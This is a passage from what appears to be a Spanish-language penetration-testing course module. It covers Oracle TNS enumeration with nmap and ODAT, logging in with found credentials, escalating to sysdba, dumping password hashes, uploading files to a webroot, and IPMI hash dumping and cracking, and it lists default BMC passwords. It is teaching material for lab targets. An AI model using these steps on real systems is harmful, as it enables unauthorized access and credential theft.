      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Aquí podemos ver un servicio llamado `ORCL`, que está escuchando en el puerto `TCP/1521` en la dirección IP `10.129.11.102`. Los clientes deben usar el nombre del servicio `orcl` al conectarse al servicio. Sin embargo, el archivo tnsnames.ora puede contener muchas de estas entradas para diferentes bases de datos y servicios. Las entradas también pueden incluir información adicional, como detalles de autenticación, configuración de agrupación de conexiones y configuraciones de equilibrio de carga.

Por otro lado, el `listener.ora` el archivo es un archivo de configuración del lado del servidor que define las propiedades y parámetros del proceso del oyente, que es responsable de recibir las solicitudes de clientes entrantes y reenviarlos a la instancia de base de datos Oracle apropiada.

#### Escuchador.ora

Código: txt

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

En resumen, el software Oracle Net Services del lado del cliente utiliza el `tnsnames.ora` archivo para resolver nombres de servicio a direcciones de red, mientras que el proceso de escucha utiliza el `listener.ora` archivo para determinar los servicios que debe escuchar y el comportamiento del oyente.

Las bases de datos Oracle se pueden proteger mediante el uso de la llamada Lista de exclusión PL/SQL (`PlsqlExclusionList`). Es un archivo de texto creado por el usuario que debe colocarse en el `$ORACLE_HOME/sqldeveloper` directorio, y contiene los nombres de paquetes PL/SQL o tipos que deben ser excluidos de la ejecución. Una vez que se crea el archivo PL/SQL Exclusion List, se puede cargar en la instancia de la base de datos. Sirve como una lista negra a la que no se puede acceder a través de Oracle Application Server.

|**Configuración**|**Descripción**|
|---|---|
|`DESCRIPTION`|Un descriptor que proporciona un nombre para la base de datos y su tipo de conexión.|
|`ADDRESS`|La dirección de red de la base de datos, que incluye el nombre de host y el número de puerto.|
|`PROTOCOL`|El protocolo de red utilizado para la comunicación con el servidor|
|`PORT`|El número de puerto utilizado para la comunicación con el servidor|
|`CONNECT_DATA`|Especifica los atributos de la conexión, como el nombre del servicio o SID, el protocolo y el identificador de instancia de base de datos.|
|`INSTANCE_NAME`|El nombre de la instancia de base de datos que el cliente desea conectar.|
|`SERVICE_NAME`|El nombre del servicio al que el cliente desea conectarse.|
|`SERVER`|El tipo de servidor utilizado para la conexión de la base de datos, como dedicado o compartido.|
|`USER`|El nombre de usuario utilizado para autenticarse con el servidor de base de datos.|
|`PASSWORD`|La contraseña utilizada para autenticarse con el servidor de base de datos.|
|`SECURITY`|El tipo de seguridad para la conexión.|
|`VALIDATE_CERT`|Si validar el certificado utilizando SSL/TLS.|
|`SSL_VERSION`|La versión de SSL/TLS a utilizar para la conexión.|
|`CONNECT_TIMEOUT`|El límite de tiempo en segundos para que el cliente establezca una conexión a la base de datos.|
|`RECEIVE_TIMEOUT`|El límite de tiempo en segundos para que el cliente reciba una respuesta de la base de datos.|
|`SEND_TIMEOUT`|El límite de tiempo en segundos para que el cliente envíe una solicitud a la base de datos.|
|`SQLNET.EXPIRE_TIME`|El límite de tiempo en segundos para que el cliente detecte una conexión ha fallado.|
|`TRACE_LEVEL`|El nivel de rastreo para la conexión de la base de datos.|
|`TRACE_DIRECTORY`|El directorio donde se almacenan los archivos de seguimiento.|
|`TRACE_FILE_NAME`|El nombre del archivo de rastreo.|
|`LOG_FILE`|El archivo donde se almacena la información de registro.|

Antes de que podamos enumerar el oyente de TNS e interactuar con él, necesitamos descargar algunos paquetes y herramientas para nuestro `Pwnbox` instancia en caso de que no tenga estos ya. Aquí hay un guión de Bash que hace todo eso:

#### Oracle-Herramientas-setup.sh

Código: bash

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

Después de eso, podemos tratar de determinar si la instalación fue exitosa ejecutando el siguiente comando:

#### Prueba de ODAT

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

Herramienta de Ataque de Base de Datos de Oracle (`ODAT`) es una herramienta de prueba de penetración de código abierto escrita en Python y diseñada para enumerar y explotar vulnerabilidades en bases de datos Oracle. Se puede utilizar para identificar y explotar varias fallas de seguridad en las bases de datos de Oracle, incluida la inyección SQL, la ejecución remota de código y la escalada de privilegios.

Usemos ahora `nmap` para escanear el puerto de escucha predeterminado de Oracle TNS.

#### Mapa

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Podemos ver que el puerto está abierto y que el servicio se está ejecutando. En Oracle RDBMS, un identificador de sistema (`SID`) es un nombre único que identifica una instancia de base de datos en particular. Puede tener múltiples instancias, cada una con su propio ID de sistema. Una instancia es un conjunto de procesos y estructuras de memoria que interactúan para administrar los datos de la base de datos. Cuando un cliente se conecta a una base de datos Oracle, especifica la base de datos `SID` junto con su cadena de conexión. El cliente utiliza este SID para identificar a qué instancia de base de datos desea conectarse. Supongamos que el cliente no especifica un SID. Luego, el valor predeterminado definido en el `tnsnames.ora` se utiliza el archivo.

Los SID son una parte esencial del proceso de conexión, ya que identifica la instancia específica de la base de datos a la que el cliente desea conectarse. Si el cliente especifica un SID incorrecto, el intento de conexión fallará. Los administradores de bases de datos pueden usar el SID para monitorear y administrar las instancias individuales de una base de datos. Por ejemplo, pueden iniciar, detener o reiniciar una instancia, ajustar su asignación de memoria u otros parámetros de configuración y supervisar su rendimiento utilizando herramientas como Oracle Enterprise Manager.

Hay varias formas de enumerar, o mejor dicho, adivinar los SID. Por lo tanto, podemos usar herramientas como `nmap`, `hydra`, `odat`, y otros. Usemos `nmap` primero.

#### Mapa - SID Bruteforcing

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

Podemos usar el `odat.py` herramienta para realizar una variedad de escaneos para enumerar y recopilar información sobre los servicios de base de datos de Oracle y sus componentes. Esos escaneos pueden recuperar nombres de bases de datos, versiones, procesos en ejecución, cuentas de usuario, vulnerabilidades, configuraciones erróneas, etc. Usemos el `all` opción y prueba todos los módulos de la `odat.py` herramienta.

#### ODATO

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

En este ejemplo, encontramos credenciales válidas para el usuario `scott` y su contraseña `tiger`. Después de eso, podemos usar la herramienta `sqlplus` para conectarse a la base de datos de Oracle e interactuar con ella.

#### SQLplus - Iniciar sesión

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

Si se encuentra con el siguiente error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, ejecute por favor el abajo, tomado de [aquí](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Hay muchos [Comandos SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) que podemos usar para enumerar la base de datos manualmente. Por ejemplo, podemos enumerar todas las tablas disponibles en la base de datos actual o mostrarnos los privilegios del usuario actual como los siguientes:

#### Oracle RDBMS - Interacción

  TNS Oracle

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Aquí, el usuario `scott` no tiene privilegios administrativos. Sin embargo, podemos intentar usar esta cuenta para iniciar sesión como Administrador de la Base de Datos del Sistema (`sysdba`), dándonos privilegios más altos. Esto es posible cuando el usuario `scott` tiene los privilegios apropiados típicamente otorgados por el administrador de la base de datos o utilizados por el administrador él/ella misma.

#### Oracle RDBMS - Enumeración de bases de datos

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

Podemos seguir muchos enfoques una vez que tengamos acceso a una base de datos Oracle. Depende en gran medida de la información que tenemos y de toda la configuración. Sin embargo, no podemos agregar nuevos usuarios ni hacer ninguna modificación. A partir de este punto, podríamos recuperar los hashes de contraseña de la `sys.user$` y trata de romperlos fuera de línea. La consulta para esto se vería como la siguiente:

#### Oracle RDBMS - Extraer Hashes de Contraseña

  TNS Oracle

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Otra opción es cargar un shell web al objetivo. Sin embargo, esto requiere que el servidor ejecute un servidor web, y necesitamos saber la ubicación exacta del directorio raíz para el servidor web. Sin embargo, si sabemos con qué tipo de sistema estamos tratando, podemos probar las rutas predeterminadas, que son:

|**OS**|**Camino**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

Primero, probar nuestro enfoque de explotación con archivos que no parecen peligrosos para los sistemas de detección/prevención de antivirus o intrusión siempre es importante. Por lo tanto, creamos un archivo de texto con una cadena y lo usamos para cargarlo en el sistema de destino.

#### Oracle RDBMS - Carga de archivos

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
vcrdcr@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finalmente, podemos probar si el enfoque de carga de archivos funcionó `curl`. Por lo tanto, usaremos un `GET http://<IP>` solicitud, o podemos visitar a través del navegador.

  TNS Oracle

```shell-session
vcrdcr@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```


# IPMI

---

[Interfaz Inteligente de Gestión de Plataformas](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) es un conjunto de especificaciones estandarizadas para sistemas de administración de host basados en hardware utilizados para la administración y monitoreo de sistemas. Actúa como un subsistema autónomo y funciona independientemente del BIOS, la CPU, el firmware y el sistema operativo subyacente del host. IPMI proporciona a los administradores de sistemas la capacidad de administrar y monitorear sistemas incluso si están apagados o en un estado que no responde. Funciona utilizando una conexión de red directa al hardware del sistema y no requiere acceso al sistema operativo a través de un shell de inicio de sesión. IPMI también se puede utilizar para actualizaciones remotas a sistemas sin requerir acceso físico al host de destino. IPMI se utiliza típicamente de tres maneras:

- Antes de que el sistema operativo se haya iniciado para modificar la configuración del BIOS
- Cuando el host está completamente apagado
- Acceso a un host después de una falla del sistema

Cuando no se usa para estas tareas, IPMI puede monitorear una variedad de cosas diferentes, como la temperatura del sistema, el voltaje, el estado del ventilador y las fuentes de alimentación. También se puede usar para consultar información de inventario, revisar registros de hardware y alertar usando SNMP. El sistema host se puede apagar, pero el módulo IPMI requiere una fuente de alimentación y una conexión LAN para funcionar correctamente.

El protocolo IPMI fue publicado por primera vez por Intel en 1998 y ahora es compatible con más de 200 proveedores de sistemas, incluidos Cisco, Dell, HP, Supermicro, Intel y más. Los sistemas que utilizan IPMI versión 2.0 se pueden administrar a través de serie a través de LAN, lo que brinda a los administradores de sistemas la capacidad de ver la salida de la consola serie en banda. Para funcionar, IPMI requiere los siguientes componentes:

- Baseboard Management Controller (BMC) - Un microcontrolador y componente esencial de un IPMI
- Intelligent Chassis Management Bus (ICMB) - Una interfaz que permite la comunicación de un chasis a otro
- Intelligent Platform Management Bus (IPMB) - amplía el BMC
- Memoria IPMI: almacena cosas como el registro de eventos del sistema, los datos del almacén del repositorio y más
- Interfaces de comunicaciones: interfaces de sistema local, interfaces serie y LAN, ICMB y PCI Management Bus

---

## Huella del Servicio

IPMI se comunica a través del puerto 623 UDP. Los sistemas que utilizan el protocolo IPMI se denominan Baseboard Management Controllers (BMC). Los BMC generalmente se implementan como sistemas ARM integrados que ejecutan Linux y se conectan directamente a la placa base del host. Los BMC están integrados en muchas placas base, pero también se pueden agregar a un sistema como una tarjeta PCI. La mayoría de los servidores vienen con un BMC o soporte para agregar un BMC. Los BMC más comunes que vemos a menudo durante las pruebas de penetración interna son HP iLO, Dell DRAC y Supermicro IPMI. Si podemos acceder a un BMC durante una evaluación, obtendríamos acceso completo a la placa base del host y podríamos monitorear, reiniciar, apagar o incluso reinstalar el sistema operativo del host. Obtener acceso a un BMC es casi equivalente al acceso físico a un sistema. Muchos BMC (incluyendo HP iLO, Dell DRAC, etcy Supermicro IPMI) exponen una consola de administración basada en web, algún tipo de protocolo de acceso remoto de línea de comandos como Telnet o SSH, y el puerto 623 UDP, que, nuevamente, es para el protocolo de red IPMI. A continuación se muestra un escaneo de Nmap de muestra usando el Nmap [versión ipmi](https://nmap.org/nsedoc/scripts/ipmi-version.html) Script NSE para hacer pisar el servicio.

#### Mapa

  IPMI

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aquí, podemos ver que el protocolo IPMI está escuchando en el puerto 623, y Nmap tiene la versión 2.0 del protocolo. También podemos utilizar el módulo escáner Metasploit [IPMI Information Discovery (auxiliar/escáner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).

#### Versión Metasploit Scan

  IPMI

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Durante las pruebas de penetración interna, a menudo encontramos BMC donde los administradores no han cambiado la contraseña predeterminada. Algunas contraseñas predeterminadas únicas para guardar en nuestras hojas de trucos incluyen:

|Producto|Nombre de usuario|Contraseña|
|---|---|---|
|IDRAC Dell|raíz|calvino|
|iLO HP|Administrador|cadena aleatoria de 8 caracteres que consiste en números y letras mayúsculas|
|IPMI Supermicro|ADMINISTRADOR|ADMINISTRADOR|

También es esencial probar contraseñas predeterminadas conocidas para CUALQUIER servicio que descubramos, ya que a menudo se dejan sin cambios y pueden generar ganancias rápidas. Cuando se trata de BMC, estas contraseñas predeterminadas pueden hacernos acceder a la consola web o incluso al acceso a la línea de comandos a través de SSH o Telnet.

---

## Configuración Peligrosa

Si las credenciales predeterminadas no funcionan para acceder a un BMC, podemos recurrir a un [defecto](http://fish2.com/ipmi/remote-pw-cracking.html) en el protocolo RAKP en IPMI 2.0. Durante el proceso de autenticación, el servidor envía un hash SHA1 o MD5 salado de la contraseña del usuario al cliente antes de que se realice la autenticación. Esto se puede aprovechar para obtener el hash de contraseña para CUALQUIER cuenta de usuario válida en el BMC. Estos hashes de contraseña se pueden descifrar fuera de línea usando un ataque de diccionario usando `Hashcat` modo `7300`. En el caso de que un HP iLO use una contraseña predeterminada de fábrica, podemos usar este comando de ataque de máscara Hashcat `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` que prueba todas las combinaciones de letras mayúsculas y números para una contraseña de ocho caracteres.

No hay una "arreglo" directo a este problema porque la falla es un componente crítico de la especificación IPMI. Los clientes pueden optar por contraseñas muy largas y difíciles de descifrar o implementar reglas de segmentación de red para restringir el acceso directo a los BMC. Es importante no pasar por alto el IPMI durante las pruebas de penetración interna (lo vemos durante la mayoría de las evaluaciones) porque no solo a menudo podemos obtener acceso a la consola web de BMC, que es un hallazgo de alto riesgo, sino que hemos visto entornos donde se establece una contraseña única (pero crackable) que luego se reutiliza en otros sistemas. En una de esas pruebas de penetración, obtuvimos un hash IPMI, lo desciframos fuera de línea usando Hashcat y pudimos SSH en muchos servidores críticos en el entorno como usuario raíz y obtener acceso a consolas de administración web para varias herramientas de monitoreo de red.

Para recuperar hashes IPMI, podemos usar el Metasploit [IPMI 2.0 RAKP Remoto SHA1 Contraseña Hash Recuperación](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) módulo.

#### Metasploit Dumping Hashes

  IPMI

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Aquí podemos ver que hemos obtenido con éxito el hash de contraseña para el usuario `ADMIN`y la herramienta pudo descifrarla rápidamente para revelar lo que parece ser una contraseña predeterminada `ADMIN`. Desde aquí, podríamos intentar iniciar sesión en el BMC o, si la contraseña fuera algo más único, verificar la reutilización de contraseñas en otros sistemas. IPMI es muy común en entornos de red, ya que los administradores de sistemas deben poder acceder a los servidores de forma remota en caso de una interrupción o realizar ciertas tareas de mantenimiento que tradicionalmente habrían tenido que estar físicamente frente al servidor para completar. Esta facilidad de administración conlleva el riesgo de exponer los hashes de contraseñas a cualquier persona en la red y puede conducir a acceso no autorizado, interrupción del sistema e incluso ejecución remota de código. La comprobación de IPMI debe ser parte de nuestro libro de pruebas de penetración interna para cualquier entorno que nos encontremos evaluando.


# Protocolos de Gestión Remota de Linux

---

En el mundo de las distribuciones de Linux, hay muchas maneras de administrar los servidores de forma remota. Por ejemplo, imaginemos que estamos en uno de los muchos lugares y uno de nuestros empleados que acaba de ir a un cliente en otra ciudad necesita nuestra ayuda debido a un error que no puede resolver. La solución eficiente de problemas se verá difícil a través de una llamada telefónica en la mayoría de los casos, por lo que es beneficioso si sabemos cómo iniciar sesión en el sistema remoto para administrarlo.

Estas aplicaciones y servicios se pueden encontrar en casi todos los servidores de la red pública. Ahorra tiempo ya que no tenemos que estar físicamente presentes en el servidor, y el entorno de trabajo todavía se ve igual. Estos protocolos y aplicaciones para la gestión remota de sistemas son un objetivo emocionante por estas razones. Si la configuración es incorrecta, nosotros, como probadores de penetración, incluso podemos acceder rápidamente al sistema remoto. Por lo tanto, debemos familiarizarnos con los protocolos, servidores y aplicaciones más importantes para este propósito.

---

## SSH

[Seguro Shell](https://en.wikipedia.org/wiki/Secure_Shell) (`SSH`) permite que dos computadoras establezcan una conexión cifrada y directa dentro de una red posiblemente insegura en el puerto estándar `TCP 22`. Esto es necesario para evitar que terceros intercepten el flujo de datos y, por lo tanto, intercepten datos confidenciales. El servidor SSH también se puede configurar para permitir solo conexiones desde clientes específicos. Una ventaja de SSH es que el protocolo se ejecuta en todos los sistemas operativos comunes. Dado que originalmente es una aplicación Unix, también se implementa de forma nativa en todas las distribuciones de Linux y MacOS. SSH también se puede utilizar en Windows, siempre que instalemos un programa apropiado. El conocido [SSH OpenBSD](https://www.openssh.com/) (`OpenSSH`) el servidor en distribuciones Linux es una bifurcación de código abierto del original y comercial `SSH` servidor de SSH Communication Security. En consecuencia, hay dos protocolos competidores: `SSH-1` y `SSH-2`.

`SSH-2`, también conocido como SSH versión 2, es un protocolo más avanzado que SSH versión 1 en cifrado, velocidad, estabilidad y seguridad. Por ejemplo, `SSH-1` es vulnerable a `MITM` ataques, mientras que SSH-2 no lo es.

Podemos imaginar que queremos administrar un host remoto. Esto se puede hacer a través de la línea de comandos o GUI. Además, también podemos usar el protocolo SSH para enviar comandos al sistema deseado, transferir archivos o hacer reenvío de puertos. Por lo tanto, necesitamos conectarnos a él utilizando el protocolo SSH y autenticarnos en él. En total, OpenSSH tiene seis métodos de autenticación diferentes:

1. Autenticación de contraseña
2. Autenticación de clave pública
3. Autenticación basada en host
4. Autenticación del teclado
5. Autenticación de respuesta al desafío
6. Autenticación GSSAPI

Echaremos un vistazo más de cerca y discutiremos uno de los métodos de autenticación más utilizados. Además, podemos obtener más información sobre los otros métodos de autenticación [aquí](https://www.golinuxcloud.com/openssh-authentication-methods-sshd-config/) entre otros.

#### Autenticación de Clave Pública

En un primer paso, el servidor SSH y el cliente se autentican entre sí. El servidor envía un certificado al cliente para verificar que es el servidor correcto. Solo cuando se establece el contacto por primera vez existe el riesgo de que un tercero se interponga entre los dos participantes y, por lo tanto, intercepte la conexión. Dado que el certificado en sí también está encriptado, no se puede imitar. Una vez que el cliente conoce el certificado correcto, nadie más puede pretender hacer contacto a través del servidor correspondiente.

Sin embargo, después de la autenticación del servidor, el cliente también debe demostrar al servidor que tiene autorización de acceso. Sin embargo, el servidor SSH ya está en posesión del valor hash cifrado de la contraseña establecida para el usuario deseado. Como resultado, los usuarios deben ingresar la contraseña cada vez que inician sesión en otro servidor durante la misma sesión. Por esta razón, una opción alternativa para la autenticación del lado del cliente es el uso de una clave pública y un par de claves privadas.

La clave privada se crea individualmente para el propio ordenador del usuario y se asegura con una frase de contraseña que debe ser más larga que una contraseña típica. La clave privada se almacena exclusivamente en nuestra propia computadora y siempre permanece en secreto. Si queremos establecer una conexión SSH, primero ingresamos la frase de contraseña y, por lo tanto, abrimos el acceso a la clave privada.

Las claves públicas también se almacenan en el servidor. El servidor crea un problema criptográfico con la clave pública del cliente y lo envía al cliente. El cliente, a su vez, descifra el problema con su propia clave privada, devuelve la solución y, por lo tanto, informa al servidor que puede establecer una conexión legítima. Durante una sesión, los usuarios solo necesitan ingresar la frase de contraseña una vez para conectarse a cualquier número de servidores. Al final de la sesión, los usuarios cierran sesión en sus máquinas locales, asegurando que ningún tercero que obtenga acceso físico a la máquina local pueda conectarse al servidor.

---

## Configuración Predeterminada

El [sshd_config](https://www.ssh.com/academy/ssh/sshd_config) el archivo, responsable del servidor OpenSSH, tiene solo algunas de las configuraciones configuradas de forma predeterminada. Sin embargo, la configuración predeterminada incluye el reenvío X11, que contenía una vulnerabilidad de inyección de comandos en la versión 7.2p1 de OpenSSH en 2016. Sin embargo, no necesitamos una GUI para administrar nuestros servidores.

#### Configuración Predeterminada

